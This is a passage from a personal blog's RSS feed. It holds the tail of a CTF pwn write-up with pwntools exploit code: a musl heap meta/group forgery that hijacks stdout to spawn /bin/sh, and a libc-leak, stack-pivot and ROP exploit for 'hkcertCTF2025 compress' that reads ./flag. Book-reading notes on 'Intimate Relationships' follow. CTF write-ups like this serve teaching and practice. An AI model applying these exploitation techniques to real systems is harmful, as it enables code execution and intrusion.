find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(malloc_context)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;find(0x28,pd)&#xA;find(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;secret=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;))&#xA;lg(&amp;#34;secret&amp;#34;)&#xA;&#xA;# set fake meta&#xA;add(0x28,b&amp;#34;5&amp;#34;*0x28,0x1200,&amp;#39;\n&amp;#39;) #0x1200:防止将mmap出来的group归还给堆管理器&#xA;last_idx, freeable, sc, maplen = 0, 1, 8, 1&#xA;#fake meta&#xA;fake_meta = p64(stdout - 0x18)                  # prev&#xA;fake_meta &amp;#43;= p64(fake_meta_addr &amp;#43; 0x30)         # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0) #对齐&#xA;#fake group&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)                    &#xA;payload = b&amp;#39;a&amp;#39; * 0xaa0 #pad,为了页对齐，让secret在页起始位置&#xA;#fake meta area&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;find(0x1200,payload)&#xA;&#xA;#设置stdout-0x10为fake_group_addr&#xA;# dequeue 2 set stdout_file - 0x10 (where the final fake group)&#xA;for _ in range(3):&#xA;   find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;6&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38) #dequeue&#xA;&#xA;# queue 把fake_meta链入active[8]&#xA;# reset fake meta , free fake chunk 2 queue it(queue the fake meta)&#xA;last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta&#xA;fake_meta = p64(0)                              # prev&#xA;fake_meta &amp;#43;= p64(0)                             # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0)&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)&#xA;payload = b&amp;#39;z&amp;#39; * 0xa90&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;#z()&#xA;find(0x1200, payload)&#xA;for _ in range(2):&#xA;    find(0x28, b&amp;#39;a&amp;#39; * 0x28)&#xA;pd=p64(elfbase&amp;#43;0x5fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;7&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;lg(&amp;#34;fake_meta_addr&amp;#34;)&#xA;&#xA;## reset fake meta&amp;#39;s group at stdout_file -0x10&#xA;last_idx, freeable, sc, maplen = 1, 0, 8, 0&#xA;fake_meta = p64(fake_meta_addr)                 # prev&#xA;fake_meta &amp;#43;= p64(fake_meta_addr)                # next&#xA;fake_meta &amp;#43;= p64(stdout - 0x10)                 # mem&#xA;fake_meta &amp;#43;= p32(1) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= b&amp;#39;a&amp;#39; * 0x18&#xA;fake_meta &amp;#43;= p64(stdout - 0x10)&#xA;payload = b&amp;#39;y&amp;#39; * 0xa80&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; b&amp;#39;\n&amp;#39;&#xA;find(0x1200, payload)&#xA;&#xA;# calloc to edit stdout 2 IO_attack&#xA;cho(1)&#xA;sla(&amp;#39;name size: &amp;#39;, str(0x28))&#xA;sa(&amp;#39;name: &amp;#39;, &amp;#39;\n&amp;#39;)&#xA;sla(&amp;#39;note size: &amp;#39;, str(0x80))#sc为8&#xA;fake_IO  = b&amp;#39;/bin/sh\x00&amp;#39;                       # flags&#xA;fake_IO &amp;#43;= p64(0)                               # rpos&#xA;fake_IO &amp;#43;= p64(0)                               # rend&#xA;fake_IO &amp;#43;= p64(libcbase &amp;#43; 0x5c9a0)              # close&#xA;fake_IO &amp;#43;= p64(1)                               # wend&#xA;fake_IO &amp;#43;= p64(0)                               # wpos&#xA;fake_IO &amp;#43;= p64(0)                               # mustbezero_1&#xA;fake_IO &amp;#43;= p64(0)                               # wbase&#xA;fake_IO &amp;#43;= p64(0)                               # read&#xA;fake_IO &amp;#43;= p64(libcbase_true &amp;#43; libc.sym[&amp;#39;system&amp;#39;])  # write&#xA;##z()&#xA;sl(fake_IO)&#xA;&#xA;&#xA;&#xA;itr()&#xA;# find bbase 0x1685&#xA;# bbase 0x178c&#xA;# bbase 0x1798&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;hkcertctf2025-_-compress&#34;&gt;&lt;span&gt;hkcertCTF2025 _ compress&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#hkcertctf2025-_-compress&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;musl v1.1.24&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;有个&lt;code&gt;gadget&lt;/code&gt;可以进行栈迁移：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; x/20i 0x49503&amp;#43;0x7ffff7c00000&#xA;   0x7ffff7c49503 &amp;lt;longjmp&amp;#43;11&amp;gt;: mov    rbx,QWORD PTR [rdi]&#xA;   0x7ffff7c49506 &amp;lt;longjmp&amp;#43;14&amp;gt;: mov    rbp,QWORD PTR [rdi&amp;#43;0x8]&#xA;   0x7ffff7c4950a &amp;lt;longjmp&amp;#43;18&amp;gt;: mov    r12,QWORD PTR [rdi&amp;#43;0x10]&#xA;   0x7ffff7c4950e &amp;lt;longjmp&amp;#43;22&amp;gt;: mov    r13,QWORD PTR [rdi&amp;#43;0x18]&#xA;   0x7ffff7c49512 &amp;lt;longjmp&amp;#43;26&amp;gt;: mov    r14,QWORD PTR [rdi&amp;#43;0x20]&#xA;   0x7ffff7c49516 &amp;lt;longjmp&amp;#43;30&amp;gt;: mov    r15,QWORD PTR [rdi&amp;#43;0x28]&#xA;   0x7ffff7c4951a &amp;lt;longjmp&amp;#43;34&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x30]&#xA;   0x7ffff7c4951e &amp;lt;longjmp&amp;#43;38&amp;gt;: mov    rsp,rdx&#xA;=&amp;gt; 0x7ffff7c49521 &amp;lt;longjmp&amp;#43;41&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x38]&#xA;   0x7ffff7c49525 &amp;lt;longjmp&amp;#43;45&amp;gt;: jmp    rdx&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;打&lt;code&gt;io_file&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;show&lt;/code&gt;泄露出libc，add通过负数偏移，能写libc中的内容&lt;/p&gt;&#xA;&lt;p&gt;写&lt;code&gt;stdin&lt;/code&gt;，&lt;code&gt;stdout&lt;/code&gt;不能动，接着往下写rop，栈迁移进行rop&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address,checksec=False)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(delim, data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;lgaddr  = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;def add(offset, content):&#xA;    &amp;#34;&amp;#34;&amp;#34;调用 add 函数&#xA;    offset: 偏移量（可以是负数或大于 0x20 的值，利用检查漏洞）&#xA;    content: 要写入的内容&#xA;    &amp;#34;&amp;#34;&amp;#34;&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;, b&amp;#39;1&amp;#39;)&#xA;    p.sendlineafter(b&amp;#39;Please input the offset:\n&amp;#39;, str(offset).encode())&#xA;    p.sendafter(b&amp;#39;Please input the Content:\n&amp;#39;, content)&#xA;&#xA;def show():&#xA;    &amp;#34;&amp;#34;&amp;#34;调用 show 函数&amp;#34;&amp;#34;&amp;#34;&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;, b&amp;#39;2&amp;#39;)&#xA;&#xA;show()&#xA;libc_base = r64() - 0x282e50 - 0x10000&#xA;lg(&amp;#34;libc_base&amp;#34;)&#xA;&#xA;&#xA;#    0x7ffff7c49503 &amp;lt;longjmp&amp;#43;11&amp;gt;: mov    rbx,QWORD PTR [rdi]&#xA;#    0x7ffff7c49506 &amp;lt;longjmp&amp;#43;14&amp;gt;: mov    rbp,QWORD PTR [rdi&amp;#43;0x8]&#xA;#    0x7ffff7c4950a &amp;lt;longjmp&amp;#43;18&amp;gt;: mov    r12,QWORD PTR [rdi&amp;#43;0x10]&#xA;#    0x7ffff7c4950e &amp;lt;longjmp&amp;#43;22&amp;gt;: mov    r13,QWORD PTR [rdi&amp;#43;0x18]&#xA;#    0x7ffff7c49512 &amp;lt;longjmp&amp;#43;26&amp;gt;: mov    r14,QWORD PTR [rdi&amp;#43;0x20]&#xA;#    0x7ffff7c49516 &amp;lt;longjmp&amp;#43;30&amp;gt;: mov    r15,QWORD PTR [rdi&amp;#43;0x28]&#xA;#    0x7ffff7c4951a &amp;lt;longjmp&amp;#43;34&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x30]&#xA;#    0x7ffff7c4951e &amp;lt;longjmp&amp;#43;38&amp;gt;: mov    rsp,rdx&#xA;# =&amp;gt; 0x7ffff7c49521 &amp;lt;longjmp&amp;#43;41&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x38]&#xA;#    0x7ffff7c49525 &amp;lt;longjmp&amp;#43;45&amp;gt;: jmp    rdx&#xA;libc.address = libc_base&#xA;magic_gadget = libc_base &amp;#43; 0x49503&#xA;pop_rdi_ret = libc_base &amp;#43; 0x14862&#xA;pop_rsi_ret = libc_base &amp;#43; 0x1c237&#xA;pop_rdx_ret = libc_base &amp;#43; 0x1bea2&#xA;pop_rax_ret = libc_base &amp;#43; 0x1b826&#xA;ret = libc_base &amp;#43; 0xcdc&#xA;fake_file_addr = libc_base &amp;#43; 0x292200&#xA;libc_end_addr = libc_base &amp;#43; 0x296000&#xA;stdin_addr = libc_base &amp;#43; 0x292200&#xA;stdout_addr = libc_base &amp;#43; 0x292300&#xA;rop_addr = libc_base &amp;#43; 0x292430&#xA;&#xA;stdout_struct = (&#xA;    p64(0x45) &amp;#43;                    # &amp;#43;0x00&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x08&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x10&#xA;    p64(libc_base &amp;#43; 0x4a957) &amp;#43;     # &amp;#43;0x18&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x20&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x28&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x30&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x38&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x40&#xA;    p64(libc_base &amp;#43; 0x4aac3) &amp;#43;     # &amp;#43;0x48&#xA;    p64(libc_base &amp;#43; 0x4aabb) &amp;#43;     # &amp;#43;0x50&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x58&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x60&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x68&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x70&#xA;    p64(0x1) &amp;#43;                     # &amp;#43;0x78&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x80&#xA;    p64(0xffffffffffffffff) &amp;#43;      # &amp;#43;0x88&#xA;    p64(0xffffffff) &amp;#43;              # &amp;#43;0x90&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x98&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0xA0&#xA;    p64(0x0)                       # &amp;#43;0xA8&#xA;)&#xA;stdout_struct = stdout_struct.ljust(0xf0, b&amp;#39;\x00&amp;#39;)&#xA;&#xA;&#xA;#0x85&#xA;rop = b&amp;#39;&amp;#39;&#xA;# rop &amp;#43;= p64(pop_rdi_ret)&#xA;# rop &amp;#43;= p64(fake_file_addr) #flag&#xA;rop &amp;#43;= p64(pop_rsi_ret)&#xA;rop &amp;#43;= p64(0)&#xA;rop &amp;#43;= p64(libc.sym[&amp;#39;open&amp;#39;])&#xA;&#xA;rop &amp;#43;= p64(pop_rdi_ret)&#xA;rop &amp;#43;= p64(3)&#xA;rop &amp;#43;= p64(pop_rsi_ret)&#xA;rop &amp;#43;= p64(libc_end_addr-0x100)&#xA;rop &amp;#43;= p64(pop_rdx_ret)&#xA;rop &amp;#43;= p64(0x100)&#xA;rop &amp;#43;= p64(libc.sym[&amp;#39;read&amp;#39;])&#xA;&#xA;rop &amp;#43;= p64(pop_rdi_ret)&#xA;rop &amp;#43;= p64(1)&#xA;rop &amp;#43;= p64(pop_rsi_ret)&#xA;rop &amp;#43;= p64(libc_end_addr-0x100)&#xA;rop &amp;#43;= p64(pop_rdx_ret)&#xA;rop &amp;#43;= p64(0x100)&#xA;rop &amp;#43;= p64(libc.sym[&amp;#39;write&amp;#39;])&#xA;&#xA;fake_file = b&amp;#34;&amp;#34;&#xA;fake_file &amp;#43;= b&amp;#34;./flag&amp;#34;.ljust(8, b&amp;#39;\x00&amp;#39;)  # flags&#xA;fake_file &amp;#43;= p64(0)  # rpos rbp&#xA;fake_file &amp;#43;= p64(0)  # rend r12&#xA;fake_file &amp;#43;= p64(0)  # close r13&#xA;fake_file &amp;#43;= p64(0)  # wend r14&#xA;fake_file &amp;#43;= p64(0)  # wpos r15&#xA;fake_file &amp;#43;= p64(rop_addr)  # mustbezero_1 rdx rsp&#xA;fake_file &amp;#43;= p64(ret)  # wbase rip&#xA;fake_file &amp;#43;= p64(0)  # read&#xA;fake_file &amp;#43;= p64(magic_gadget)  # write&#xA;fake_file = fake_file.ljust(0xf0, b&amp;#39;\x00&amp;#39;)  # lock = 0&#xA;&#xA;pl = p64(0)*4&#xA;pl &amp;#43;=  fake_file &amp;#43; p64(0)*2&#xA;pl&amp;#43;=  stdout_struct&#xA;pl &amp;#43;= b&amp;#34;\x00&amp;#34;*0x40&#xA;pl &amp;#43;= rop&#xA;# dbg()&#xA;add(-0x30e0-0x100,pl)&#xA;&#xA;# 0x0000000000025b40 : push rax ; ret&#xA;&#xA;&#xA;itr()&#xA;# b *0x7ffff7c00000&amp;#43;0x49503&#xA;# stdin dq 0x00007ffff7e92200 32 &#xA;# bbase 0xa9f&#xA;# sbase 0x201FE0&#xA;# 0x781e1ce953c0&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>《亲密关系》</title>
      <link>http://localhost:1313/posts/read_qmgx/</link>
      <pubDate>Thu, 23 Oct 2025 23:55:44 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_qmgx/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;应警惕的观点：伴侣是不会发生改变的。一旦亲密关系变糟，就无法得到改善。如果爱人曾伤害过你，毫无疑问还会一而再，再而三地伤害你。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;持有成长信念的人还能心平气和地讨论爱人的缺点；相形之下，持有宿命信念的人一谈到伴侣的缺陷就充满敌意&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人们究竟要怎样才能与爱恋自己的人快乐相处呢？1.建立对伴侣善意和大度的认知，突出他们的美德而缩小他们的缺陷&#xA;2.随着对伴侣了解程度的增加，不断调整自己对理想伴侣的期望&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;对他人的期望能引导我们对他人做出的行为反应，所以期望具有促动作用&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;找到你生命中的真爱并不能让你永远幸福。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;ul&gt;&#xA;&lt;li&gt;自主(autonomy)：允许你的伴侣在亲密关系之外还能拥有自己的朋友和兴趣爱好；不要有太强的占有欲。(37%)&lt;/li&gt;&#xA;&lt;li&gt;相似(similarity)：你和伴侣应该有相似的态度、价值观和兴趣；差别不要太大。(30%)&lt;/li&gt;&#xA;&lt;li&gt;支持(supportiveness)：提升伴侣的自我价值和自尊；不要粗枝大叶或不够体贴。(27%)&lt;/li&gt;&#xA;&lt;li&gt;开放(openness)：真诚而又真实地进行自我表露；不要什么都不说。(22%)&lt;/li&gt;&#xA;&lt;li&gt;忠诚(fidelity)：对你的伴侣保持忠诚；不要出轨。(17%)&lt;/li&gt;&#xA;&lt;li&gt;共处(togetherness)：一起分享大量的时间；尽量不要上夜班或搬到外地，不要在其他地方花太多时间。(16%)&lt;/li&gt;&#xA;&lt;li&gt;公平(equity)：秉持公正与公平；不要利用和剥削你的伴侣。(12%)&lt;/li&gt;&#xA;&lt;li&gt;魔力(magic)：保持浪漫；拒绝平淡。(10%)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;翻来覆去的反刍思维(rumination)只会延长我们的痛苦，而反省（即找寻经历中的意义并期望从中学习）则与积极的调适和恢复有关(Saffrey &amp;amp; Ehrenberg, 2007)&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;为了忘掉前任，他们可以着手浏览约会网站，看看那里都有些什么样的人；焦虑的人把目光投向新朋友，反倒更容易从失败的亲密关系中走出来(Spielmann et al., 2009)。但是，任何人都不应该再去浏览前任的社交网络上的主页；人们用于查看前任主页上的时间越多，其感情创伤愈合并开始新生活所需的时间就越长&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;与那些父母仍维持婚姻的孩子相比，父母离异的孩子在青少年期和成年早期的幸福感都较低。他们的心理适应能力相对低下，体验到更多的抑郁和焦虑，对生活的满意度较低。他们的问题行为更多，如吸毒、违法、少女怀孕、学业不良等问题更为严重。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw 